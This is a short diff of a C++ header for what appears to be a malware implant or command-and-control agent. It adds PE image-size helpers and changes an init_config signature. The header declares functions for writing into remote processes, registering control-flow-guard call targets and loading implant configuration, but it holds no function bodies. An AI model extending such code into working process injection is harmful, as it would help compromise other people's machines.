@@ -10,10 +10,13 @@
 #include <macro.hpp>
 #include <structs.hpp>
 #include <function_ptrs.hpp>
+#include <vector>
 
 namespace tasking {
     uint32_t    rva_of(HMODULE module_ptr, const std::string& func_name, void** func_address);
     uint32_t    get_entry_point_rva(const std::string& file_buffer);
+    uint32_t    get_img_size(char* original_base);
+    uint32_t    get_img_raw_size(char* original_base);
 
     void*       get_img_preferred_base(const std::string& file_buffer);
     void*       get_env_block();
@@ -28,7 +31,7 @@ namespace tasking {
     bool        add_cfg_call_target(char* module_base, void* function_address);
     void*       remote_alloc(HANDLE hprocess, void* preferred, uint32_t size, uint32_t protect);
     bool        remote_write(HANDLE hprocess, void* destination, void* source, size_t size, uint32_t protect_after);
-    bool        init_config(const volatile char* pmetadata, implant_context& ctx);
+    bool        init_config(const char* pmetadata, implant_context& ctx);
 }
 
 namespace tasking {
